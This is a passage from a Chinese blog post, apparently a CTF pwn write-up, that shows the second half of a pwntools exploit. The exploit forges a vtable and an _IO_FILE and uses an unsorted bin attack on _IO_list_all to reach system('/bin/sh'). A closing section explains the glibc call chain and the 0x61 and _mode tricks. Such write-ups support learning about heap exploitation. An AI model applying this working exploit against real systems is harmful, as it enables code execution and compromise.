+<span class="line"></span>
+<span class="line"><span style="color:#24292E">upgrade(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">10</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'abcd'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">4</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">see()</span></span>
+<span class="line"><span style="color:#24292E">io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'abcdabcdabcdabcd'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">heap_base </span><span style="color:#D73A49">=</span><span style="color:#24292E"> u64(io.recvn(</span><span style="color:#005CC5">6</span><span style="color:#24292E">).ljust(</span><span style="color:#005CC5">8</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\0</span><span style="color:#032F62">'</span><span style="color:#24292E">))</span><span style="color:#D73A49">-0x</span><span style="color:#005CC5">c0</span></span>
+<span class="line"><span style="color:#24292E">info(</span><span style="color:#032F62">'heap_base: '</span><span style="color:#D73A49"> +</span><span style="color:#005CC5"> hex</span><span style="color:#24292E">(heap_base))</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">覆盖fd和bk</span></span>
+<span class="line"><span style="color:#032F62">fd_nextsize和bk_nextsize写的是heap地址</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">vtable_addr </span><span style="color:#D73A49">=</span><span style="color:#24292E"> heap_base </span><span style="color:#D73A49">+</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">d0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">伪造虚函数表</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#24292E">vtable </span><span style="color:#D73A49">=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span><span style="color:#D73A49">*</span><span style="color:#005CC5">3</span><span style="color:#D73A49">+</span><span style="color:#24292E">p64(system)</span></span>
+<span class="line"><span style="color:#24292E">vtable </span><span style="color:#D73A49">=</span><span style="color:#24292E"> vtable.ljust(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">400</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\0</span><span style="color:#032F62">'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">=</span><span style="color:#24292E"> vtable</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">伪造_IO_FILE结构体</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span><span style="color:#D73A49">+</span><span style="color:#24292E">p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">21</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p32(</span><span style="color:#005CC5">1</span><span style="color:#24292E">)</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">DDAA</span><span style="color:#24292E">)</span><span style="color:#D73A49">+</span><span style="color:#24292E">p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'/bin/sh</span><span style="color:#005CC5">\x00</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">61</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#6A737D"># 这个0x61的原因写在后记中</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span><span style="color:#D73A49">+</span><span style="color:#24292E">p64(</span><span style="color:#005CC5">IO_list_all</span><span style="color:#D73A49">-0x</span><span style="color:#005CC5">10</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span><span style="color:#D73A49">+</span><span style="color:#24292E">p64(</span><span style="color:#005CC5">1</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span><span style="color:#D73A49">*</span><span style="color:#005CC5">21</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(vtable_addr)</span></span>
+<span class="line"><span style="color:#24292E">upgrade(</span><span style="color:#005CC5">len</span><span style="color:#24292E">(extend), extend)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">触发unsorted bin attack</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#24292E">cmd(</span><span style="color:#005CC5">1</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre>
+<h3 id="后记">后记</h3>
+<h4 id="流程">流程</h4>
+<blockquote>
+<p>调用链：_libc_malloc -> malloc_printerr -> libc_message -> abort -> fflush(_IO_fflush) -> _IO_flush_all -> _IO_flush_all_lockp -> _IO_OVERFLOW</p>
+</blockquote>
+<h4 id="0x61">0x61</h4>
+<p>关键在于 <code>_IO_FILE</code> 的 <code>_chain</code> 字段——它决定遍历时下一个结构在哪。</p>
+<p><code>_IO_list_all</code> 被劫持成 <code>main_arena+88</code> 之后，按 <code>_chain</code> 的偏移（<code>0x68</code>）算出来正好是 <code>main_arena+168</code>，而那正是 <code>small bin[0x60]</code> 的链表头。</p>
+<p>于是把 <code>unsorted bin</code> 里那个 chunk 的 size 字段改成 <code>0x61</code>（即 0x60 大小的 chunk）：下次 <code>malloc</code> 整理 <code>unsorted bin</code> 时，它会按这个 size 被挂进 <code>small bin[0x60]</code>，而挂进去就会改写这块链表的 <code>bk</code>——也就是让 <code>main_arena+168</code> 指向我们堆上伪造的结构。</p>
+<p>遍历走到这里，第二个 <code>_IO_FILE</code> 就是我们伪造的 <code>_IO_FILE_plus</code>。</p>
+<h4 id="概率通过">概率通过</h4>
+<p>这一步有时能过有时不能，差别在结构体的 <code>_mode</code> 字段。</p>
+<p>遍历时每个结构都要先过一遍 <code>_IO_flush_all_lockp</code> 的检查，<code>_mode</code> 为正就会被认定”需要 flush”，直接调用 <code>_IO_OVERFLOW</code>。而第一个结构其实是 arena 里的垃圾数据，它一崩，程序就在走到我们伪造的结构之前结束了。所以要让 <code>_mode</code> 落在负数区间，把第一个结构跳过去。</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="C"><code><span class="line"><span style="color:#D73A49">int</span></span>
+<span class="line"><span style="color:#6F42C1">_IO_flush_all_lockp</span><span style="color:#24292E"> (</span><span style="color:#D73A49">int</span><span style="color:#E36209"> do_lock</span><span style="color:#24292E">) # do_lock </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 1</span></span>
+<span class="line"><span style="color:#24292E">{</span></span>
+<span class="line"><span style="color:#D73A49">  int</span><span style="color:#24292E"> result </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 0</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#D73A49">  struct</span><span style="color:#24292E"> _IO_FILE </span><span style="color:#D73A49">*</span><span style="color:#24292E">fp;</span></span>
+<span class="line"><span style="color:#D73A49">  int</span><span style="color:#24292E"> last_stamp;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">#ifdef</span><span style="color:#6F42C1"> _IO_MTSAFE_IO</span></span>
+<span class="line"><span style="color:#6F42C1">  __libc_cleanup_region_start</span><span style="color:#24292E"> (do_lock, flush_cleanup, </span><span style="color:#005CC5">NULL</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#D73A49">  if</span><span style="color:#24292E"> (do_lock)</span></span>
+<span class="line"><span style="color:#6F42C1">    _IO_lock_lock</span><span style="color:#24292E"> (list_all_lock);</span></span>
+<span class="line"><span style="color:#D73A49">#endif</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">  last_stamp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> _IO_list_all_stamp;</span></span>
+<span class="line"><span style="color:#24292E">  fp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> (_IO_FILE </span><span style="color:#D73A49">*</span><span style="color:#24292E">) _IO_list_all;</span></span>
+<span class="line"><span style="color:#D73A49">  while</span><span style="color:#24292E"> (fp </span><span style="color:#D73A49">!=</span><span style="color:#005CC5"> NULL</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    {</span></span>
+<span class="line"><span style="color:#24292E">      run_fp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> fp;</span></span>
+<span class="line"><span style="color:#D73A49">      if</span><span style="color:#24292E"> (do_lock)</span></span>
+<span class="line"><span style="color:#6F42C1">    _IO_flockfile</span><span style="color:#24292E"> (fp);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">      if</span><span style="color:#24292E"> (((fp->_mode </span><span style="color:#D73A49">&#x3C;=</span><span style="color:#005CC5"> 0</span><span style="color:#D73A49"> &#x26;&#x26;</span><span style="color:#24292E"> fp->_IO_write_ptr </span><span style="color:#D73A49">></span><span style="color:#24292E"> fp->_IO_write_base)</span></span>
+<span class="line"><span style="color:#D73A49">#if</span><span style="color:#D73A49"> defined</span><span style="color:#6F42C1"> _LIBC</span><span style="color:#D73A49"> ||</span><span style="color:#D73A49"> defined</span><span style="color:#6F42C1"> _GLIBCPP_USE_WCHAR_T</span></span>
+<span class="line"><span style="color:#D73A49">       ||</span><span style="color:#24292E"> (</span><span style="color:#6F42C1">_IO_vtable_offset</span><span style="color:#24292E"> (fp) </span><span style="color:#D73A49">==</span><span style="color:#005CC5"> 0</span></span>
+<span class="line"><span style="color:#D73A49">           &#x26;&#x26;</span><span style="color:#24292E"> fp->_mode </span><span style="color:#D73A49">></span><span style="color:#005CC5"> 0</span><span style="color:#D73A49"> &#x26;&#x26;</span><span style="color:#24292E"> (fp->_wide_data->_IO_write_ptr</span></span>
+<span class="line"><span style="color:#D73A49">                    ></span><span style="color:#24292E"> fp->_wide_data->_IO_write_base))</span></span>
+<span class="line"><span style="color:#D73A49">#endif</span></span>
+<span class="line"><span style="color:#24292E">       )</span></span>
+<span class="line"><span style="color:#D73A49">      &#x26;&#x26;</span><span style="color:#6F42C1"> _IO_OVERFLOW</span><span style="color:#24292E"> (fp, EOF) </span><span style="color:#D73A49">==</span><span style="color:#24292E"> EOF)</span></span>
+<span class="line"><span style="color:#24292E">    result </span><span style="color:#D73A49">=</span><span style="color:#24292E"> EOF;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">      if</span><span style="color:#24292E"> (do_lock)</span></span>
+<span class="line"><span style="color:#6F42C1">    _IO_funlockfile</span><span style="color:#24292E"> (fp);</span></span>
+<span class="line"><span style="color:#24292E">      run_fp </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> NULL</span><span style="color:#24292E">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">      if</span><span style="color:#24292E"> (last_stamp </span><span style="color:#D73A49">!=</span><span style="color:#24292E"> _IO_list_all_stamp)</span></span>
+<span class="line"><span style="color:#24292E">    {</span></span>
+<span class="line"><span style="color:#6A737D">      /* Something was added to the list.  Start all over again.  */</span></span>
+<span class="line"><span style="color:#24292E">      fp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> (_IO_FILE </span><span style="color:#D73A49">*</span><span style="color:#24292E">) _IO_list_all;</span></span>
+<span class="line"><span style="color:#24292E">      last_stamp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> _IO_list_all_stamp;</span></span>
+<span class="line"><span style="color:#24292E">    }</span></span>
+<span class="line"><span style="color:#D73A49">      else</span></span>
+<span class="line"><span style="color:#24292E">    fp </span><span style="color:#D73A49">=</span><span style="color:#24292E"> fp->_chain;</span></span>
+<span class="line"><span style="color:#24292E">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">#ifdef</span><span style="color:#6F42C1"> _IO_MTSAFE_IO</span></span>
+<span class="line"><span style="color:#D73A49">  if</span><span style="color:#24292E"> (do_lock)</span></span>
+<span class="line"><span style="color:#6F42C1">    _IO_lock_unlock</span><span style="color:#24292E"> (list_all_lock);</span></span>
+<span class="line"><span style="color:#6F42C1">  __libc_cleanup_region_end</span><span style="color:#24292E"> (</span><span style="color:#005CC5">0</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#D73A49">#endif</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">  return</span><span style="color:#24292E"> result;</span></span>
+<span class="line"><span style="color:#24292E">}</span></span></code></pre>
+<p>而我们只控制了第二个结构体的 <code>vtable</code>，程序就直接结束了。</p></div><nav class="pager" aria-label="同分类内的上一篇 / 下一篇" data-astro-cid-tldeq5d5><div class="pager-item" data-astro-cid-tldeq5d5><span class="pager-label" data-astro-cid-tldeq5d5>← 上一篇</span><a href="/posts/io-file-base/" data-astro-cid-tldeq5d5>IO_FILE 浅析</a></div><div class="pager-item next" data-astro-cid-tldeq5d5><span class="pager-label" data-astro-cid-tldeq5d5>下一篇 →</span><a href="/posts/test_of_record/" data-astro-cid-tldeq5d5>PWNer的历险记</a></div></nav></article></div></main><footer class="colophon" data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="links" data-astro-cid-jo6i4kqk><a href="/posts" data-astro-cid-jo6i4kqk>归档</a><a href="/tags" data-astro-cid-jo6i4kqk>标签</a></p><p class="sign" data-astro-cid-jo6i4kqk>Findkey · 二〇二六</p></div></footer><script type="module">function e(e){let t=document.createElement(`textarea`);t.value=e,t.setAttribute(`readonly`,``),t.style.position=`fixed`,t.style.top=`-1000px`,document.body.appendChild(t),t.select();let n=!1;try{n=document.execCommand(`copy`)}catch{n=!1}return t.remove(),n}async function t(t,n){let r=n.textContent;try{if(navigator.clipboard?.writeText)await navigator.clipboard.writeText(t);else if(!e(t))throw Error(`copy failed`);n.textContent=`已复制`}catch{n.textContent=e(t)?`已复制`:`复制失败`}setTimeout(()=>{n.textContent=r},1400)}function n(e){if(e.closest(`.code-block`))return;let n=document.createElement(`div`);n.className=`code-block`,e.parentNode?.insertBefore(n,e);let r=(e.textContent??``).replace(/\n$/,``),i=r.split(`
+`).length,a=document.createElement(`div`);a.className=`code-head`;let o=document.createElement(`button`);if(o.type=`button`,o.className=`code-btn`,o.textContent=`复制`,o.addEventListener(`click`,()=>t(r,o)),a.appendChild(o),n.appendChild(a),i>26){let t=document.createElement(`div`);t.className=`code-body is-folded`,t.style.maxHeight=`21rem`,t.appendChild(e),n.appendChild(t);let r=document.createElement(`button`);r.type=`button`,r.className=`code-more`,r.textContent=`展开（共 ${i} 行）`,r.addEventListener(`click`,()=>{let e=t.classList.toggle(`is-folded`);t.style.maxHeight=e?`21rem`:`none`,r.textContent=e?`展开（共 ${i} 行）`:`收起`,e&&n.getBoundingClientRect().top<60&&n.scrollIntoView({behavior:`smooth`,block:`nearest`})}),n.appendChild(r)}else n.appendChild(e)}function r(){document.querySelectorAll(`.prose pre`).forEach(n)}r(),document.addEventListener(`astro:page-load`,r);</script></body></html>
